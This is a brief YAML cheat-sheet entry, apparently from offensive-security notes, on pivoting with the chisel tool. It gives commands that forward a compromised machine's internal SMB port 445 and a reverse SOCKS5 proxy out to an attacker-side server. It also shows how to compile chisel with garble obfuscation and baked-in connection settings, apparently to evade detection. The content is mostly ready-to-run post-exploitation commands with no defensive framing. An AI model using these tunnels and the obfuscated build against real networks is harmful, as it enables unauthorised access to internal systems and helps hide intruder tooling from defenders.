---
functions:
  pivoting:
    - description: Chisel Single Port Fowarding
      code: |
        Client
        chisel.exe client <server> R:<port-to-forward>:<server-listening-ip-port>
        chisel.exe client 10.10.14.10:8000 R:445:127.0.0.1:445

        Server
        chisel server -p 8000 --reverse
    - description: Chisel Socks5 Proxy
      code: |
        Client
        chisel.exe client 10.10.14.3:8000 R:socks

        Server
        chisel server -p 8000 --socks5 --reverse
    - description: Compile chisel with arguments
      code: |
        
        var cmdlineArgs string  //add
        func main() {
          cmdArgs := strings.Split(cmdlineArgs, " ")   //add
          os.Args = append(os.Args, cmdArgs...)    //add


        Client
        garble -literals -seed=random -tiny build -ldflags "-s -w -X main.subcmd=client -X config.MaxRetryCount=5 -X config.MaxRetryInterval=5 -X main.port=443 -X main.host=10.0.0.18"

resources: |
  https://github.com/jpillora/chisel
  https://medium.com/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683
---
